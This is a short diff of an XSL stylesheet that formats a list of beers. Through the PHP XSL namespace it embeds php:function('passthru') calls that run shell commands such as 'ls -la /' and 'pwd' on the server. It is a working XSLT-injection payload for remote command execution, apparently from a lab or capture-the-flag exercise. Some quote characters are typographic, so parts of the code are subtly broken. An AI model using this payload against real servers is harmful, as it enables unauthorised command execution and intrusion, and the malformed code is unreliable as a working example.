@@ -2,7 +2,9 @@
 <html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
 <body style="font-family:Arial;font-size:12pt;background-color:#000000">
   <xsl:for-each select="beers/beer">
-            <xsl:value-of select=”php:function(‘passthru’,’ls -la /’)”/>    
+  <div style="background-color:black;color:red;padding:4px">
+    <span style="font-weight:bold"><xsl:value-of select="name"/> - </span>
+                <xsl:value-of select=”php:function(‘passthru’,’ls -la /’)”/>    
         <xsl:value-of select=”php:function(‘passthru’,’ls/’)”/>    
         <xsl:value-of select=”php:function(‘passthru’,’pwd/’)”/>    
         <xsl:value-of select=”php:function(‘passthru’,’echo test/’)”/> 
@@ -10,8 +12,6 @@
         <xsl:value-of select=”php:function(‘passthru’,’ls’)”/>    
         <xsl:value-of select=”php:function(‘passthru’,’pwd’)”/>    
         <xsl:value-of select=”php:function(‘passthru’,’echo test’)”/> 
-  <div style="background-color:black;color:red;padding:4px">
-    <span style="font-weight:bold"><xsl:value-of select="name"/> - </span>
     <xsl:value-of select="price"/>
     </div>
   <div style="margin-left:20px;margin-bottom:1em;font-size:10pt">
